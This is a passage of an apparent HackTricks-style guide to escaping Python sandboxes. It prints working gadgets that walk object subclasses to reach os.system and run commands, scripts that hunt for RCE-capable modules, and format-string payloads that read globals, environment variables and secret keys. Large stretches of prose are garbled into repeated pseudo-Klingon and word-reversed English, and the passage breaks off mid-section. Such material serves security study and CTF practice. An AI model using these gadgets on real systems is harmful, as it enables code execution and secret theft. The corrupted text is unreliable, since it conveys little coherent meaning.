[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
DaH jImej, maHeghDI' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh '
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
DaH jImej, **ghItlh libraries** **ghaH 'ej commands execute functions'** **invoke** **chel** **'ej, **we can also **filter by functions names** **inside the possible libraries**:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## Recursive Search of Builtins, Globals...

{% hint style="warning" %}
**Qapla'!** Qagh 'oH **jatlh**. Qo'noS **ghaH 'e' vItlhutlh, builtins, open** bejegh 'e' vItlhutlh **ghItlhvam script** vItlhutlh **ghItlhvam lo'laHvam vItlhutlh.**
{% endhint %}
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
You can check the output of this script on this page:

{% content-ref url="broken-reference" %}
[Broken link](broken-reference)
{% endcontent-ref %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Python Format String

If you **send** a **string** to python that is going to be **formatted**, you can use `{}` to access **python internal information.** You can use the previous examples to access globals or builtins for example.

{% hint style="info" %}
However, there is a **limitation**, you can only use the symbols `.[]`, so you **won't be able to execute arbitrary code**, just to read information.\
_**If you know how to execute code through this vulnerability, please contact me.**_
{% endhint %}
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
Qapla'! jatlhpu' **Dot** vItlhutlh 'ej **people_obj.__init__** laH **attributes** **access** **'ej** **parenthesis** **dict element** **quotes** **without** `__globals__[CONFIG]`

'ej **enumerate** **elements** **object** **`.__dict__`** **use** **can** **you** **note** **Also** `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)` **object** **indicated** **the** **functions** **`str`**, **`repr`** **`ascii`** **executing** **of** **possibility** **the** **is** **strings format** **from** **other** **Some** **characteristics** **interesting**:
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
**Qatlh**, **ghaH** **code** **new formatters** **in classes** **possible**:
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**ghItlh examples** about **format** **string** examples can be found in [**https://pyformat.info/**](https://pyformat.info)

{% hint style="danger" %}
Check also the following page for gadgets that will r**ead sensitive information from Python internal objects**:
{% endhint %}

{% content-ref url="../python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
{% endcontent-ref %}

### Sensitive Information Disclosure Payloads
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```
## Dissecting Python Objects

{% hint style="info" %}
If you want to **learn** about **python bytecode** in depth read this **awesome** post about the topic: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
{% endhint %}

In some CTFs you could be provided with the name of a **custom function where the flag** resides and you need to see the **internals** of the **function** to extract it.

This is the function to inspect:
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### qImHa' 

